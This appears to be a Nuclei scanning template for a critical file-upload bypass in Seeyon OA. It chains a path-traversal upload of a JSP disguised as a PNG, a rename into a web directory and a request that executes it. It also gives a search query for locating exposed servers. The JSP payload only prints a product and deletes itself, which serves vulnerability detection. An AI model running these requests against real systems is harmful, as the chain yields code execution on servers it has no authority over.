http:
- extractors:
  - group: 1
    internal: true
    name: fileid
    part: body
    regex:
    - fileurls=fileurls\+","\+.*([[:alnum:]]{19}).;
    type: regex
  matchers:
  - condition: and
    dsl:
    - status_code_3 == 200
    - contains(body_3, '{{result}}')
    type: dsl
  raw:
  - 'POST /seeyon/autoinstall.do/../../seeyon/fileUpload.do?method=processUpload HTTP/1.1

    Host: {{Hostname}}

    Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2

    Content-Type: multipart/form-data; boundary={{boundary}}


    --{{boundary}}

    Content-Disposition: form-data; name="type"



    --{{boundary}}

    Content-Disposition: form-data; name="extensions"


    png

    --{{boundary}}

    Content-Disposition: form-data; name="applicationCategory"



    --{{boundary}}

    Content-Disposition: form-data; name="destDirectory"



    --{{boundary}}

    Content-Disposition: form-data; name="destFilename"



    --{{boundary}}

    Content-Disposition: form-data; name="maxSize"



    --{{boundary}}

    Content-Disposition: form-data; name="isEncrypt"


    false

    --{{boundary}}

    Content-Disposition: form-data; name="file1"; filename="{{png_filename}}"

    Content-Type: Content-Type: application/pdf


    <% out.print({{num1}}*{{num2}});new java.io.File(application.getRealPath(request.getServletPath())).delete();
    %>

    --{{boundary}}--

    '
  - 'POST /seeyon/autoinstall.do/../../seeyon/privilege/menu.do HTTP/1.1

    Host: {{Hostname}}

    Content-type: application/x-www-form-urlencoded


    method=uploadMenuIcon&fileid={{fileid}}&filename={{filename}}

    '
  - 'GET /seeyon/main/menuIcon/{{filename}} HTTP/1.1

    Host: {{Hostname}}

    '
id: seeyon-oa-fileupload-bypass
info:
  author: Co5mos
  description: "\u81F4\u8FDC\u4E92\u8054-OA\u524D\u53F0 fileUpload.do \u5B58\u5728\
    \u7ED5\u8FC7\u6587\u4EF6\u4E0A\u4F20\u6F0F\u6D1E\uFF0C\u6076\u610F\u653B\u51FB\
    \u8005\u53EF\u80FD\u5229\u7528\u8BE5\u6F0F\u6D1E\u4E0A\u4F20\u4EFB\u610F\u6587\
    \u4EF6\uFF0C\u4ECE\u800C\u6267\u884C\u6076\u610F\u4EE3\u7801\u6216\u83B7\u53D6\
    \u670D\u52A1\u5668\u6743\u9650\u3002\n"
  metadata:
    fofa-query: "app=\"FE-\u534F\u4F5C\u5E73\u53F0\" || title=\"\u534F\u540C\u7BA1\
      \u7406\u8F6F\u4EF6 V5.6SP1\""
  name: Seeyon OA File Upload Bypass Vulnerability
  severity: critical
  tags: file-upload, seeyon
variables:
  boundary: '{{rand_base(20)}}'
  filename: '{{rand_base(6)}}.jsp'
  num1: '{{rand_int(10000, 20000)}}'
  num2: '{{rand_int(10000, 20000)}}'
  png_filename: '{{rand_base(6)}}.png'
  result: '{{to_number(num1)*to_number(num2)}}'
